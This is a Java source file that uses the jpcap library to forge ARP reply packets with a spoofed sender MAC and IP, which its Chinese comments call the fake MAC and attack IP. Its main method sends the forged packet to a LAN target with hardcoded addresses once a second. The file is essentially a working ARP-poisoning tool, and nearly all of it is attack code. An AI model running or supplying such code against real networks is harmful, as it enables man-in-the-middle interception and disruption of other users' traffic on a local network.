package com.tangqiang.jpcap.arp;

import java.io.IOException;
import java.net.InetAddress;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import jpcap.packet.Packet;

/**
 * 
 * 
 * @author tqiang
 * @email tom617288330@gmail.com
 * @date 2014-8-11 下午12:00:41
 * 
 * @version 1.0 2014-8-11 tqiang create
 * 
 */
public class ChangeARP {
	private NetworkInterface[] devices; // 设备列表
	private NetworkInterface device; // 要使用的设备
	private JpcapCaptor jpcap; // 与设备的连接
	private JpcapSender sender; // 用于发送的实例
	private byte[] targetMAC, gateMAC; // B的MAC地址，网关的MAC地址
	private String targetIp, gateIp; // B的IP地址，网关的IP地址

	public static void main(String[] args) {
		
		try {
			System.out.println("----------");
			ChangeARP ca= new ChangeARP();
			Packet p = ca.getArpPackage(ca.turnMac("44-8a-5b-53-ef-fb"), "10.1.33.222",ca.turnMac("5c-dd-70-85-fc-24"), "10.1.33.254");
			new PacketSendThread(p, 1000).start();
		} catch (Exception e) {
			e.printStackTrace();
		}
		
	}

	/**
	 * 
	 * @param senderMac
	 *            伪Mac地址
	 * @param senderIp
	 *            攻击Ip
	 * @param targetMac
	 *            网关Mac
	 * @param targetIp
	 *            网关IP
	 * @return
	 * @throws Exception
	 */
	public ARPPacket getArpPackage(byte[] senderMac, String senderIp, byte[] targetMac, String targetIp) throws Exception {
		ARPPacket arpPacket = new ARPPacket(); // 修改B的ARP表的ARP包
		arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER; // 选择以太网类型(Ethernet)
		arpPacket.prototype = ARPPacket.PROTOTYPE_IP; // 选择IP网络协议类型
		arpPacket.operation = ARPPacket.ARP_REPLY; // 选择REPLY类型
		arpPacket.hlen = 6; // MAC地址长度固定6个字节
		arpPacket.plen = 4; // IP地址长度固定4个字节
		arpPacket.sender_hardaddr = senderMac; // A的MAC地址
		arpPacket.sender_protoaddr = InetAddress.getByName(senderIp).getAddress(); // 网关IP
		arpPacket.target_hardaddr = targetMac; // B的MAC地址
		arpPacket.target_protoaddr = InetAddress.getByName(targetIp).getAddress(); // B的IP

		EthernetPacket ethToTarget = new EthernetPacket(); // 创建一个以太网头
		ethToTarget.frametype = EthernetPacket.ETHERTYPE_ARP; // 选择以太包类型
		ethToTarget.src_mac = senderMac; // A的MAC地址
		ethToTarget.dst_mac = targetMac; // B的MAC地址
		arpPacket.datalink = ethToTarget; // 将以太头添加到ARP包前
		return arpPacket;
	}

	public byte[] turnMac(String s) throws Exception{
			byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };
			String[] s1 = s.split("-");
			for (int x = 0; x < s1.length; x++) {
				mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);
			}
			return mac;
	}
}
